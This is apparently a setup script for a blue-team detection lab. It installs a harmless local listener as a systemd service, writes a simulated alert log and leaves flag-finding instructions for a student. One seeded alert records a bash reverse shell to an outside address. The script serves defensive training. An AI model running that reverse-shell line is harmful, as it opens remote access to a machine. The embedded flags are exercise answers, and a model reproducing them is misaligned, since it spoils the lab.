#!/usr/bin/env bash
set -euo pipefail
mkdir -p /opt/blue-team
cat > /usr/local/bin/rogue-beacon.py <<PY
import time, socket
# Simulated suspicious local listener & beacon (benign)
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 4444))
s.listen(1)
while True:
    time.sleep(60)
PY
cat > /etc/systemd/system/rogue-beacon.service <<UNIT
[Unit]
Description=Simulated Suspicious Listener (m09)
[Service]
Environment=BEACON_KEY=${FLAG_PROC:-FLAG{proc}}
ExecStart=/usr/bin/python3 /usr/local/bin/rogue-beacon.py
Restart=on-failure
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload && systemctl enable --now rogue-beacon.service
cat > /var/log/blue-team-alerts.jsonl <<JSONL
{"ts":"2026-11-22T01:10:00Z","rule":"T1059.004","severity":"high","host":"workstation-04","cmd":"bash -i >& /dev/tcp/198.51.100.9/4444 0>&1","alert_id":"${FLAG_ALERT:-FLAG{alert}}"}
{"ts":"2026-11-22T01:12:14Z","rule":"T1053.003","severity":"medium","host":"workstation-04","cmd":"crontab -e","alert_id":"ALT-002"}
JSONL
chmod 644 /var/log/blue-team-alerts.jsonl
cat > /home/student/README-LAB.txt <<'TXT'
=== DEAD3ARS LAB: m09-detection-blue-team ===
Objectives (2 Flags):
1. [alert] Inspect /var/log/blue-team-alerts.jsonl to find the high-severity T1059.004 alert_id flag.
2. [proc]  Find the suspicious process listening on 127.0.0.1:4444 (ss -tlnp / ps aux) and inspect its systemd unit (/etc/systemd/system/rogue-beacon.service) for BEACON_KEY.
TXT
chown student:student /home/student/README-LAB.txt
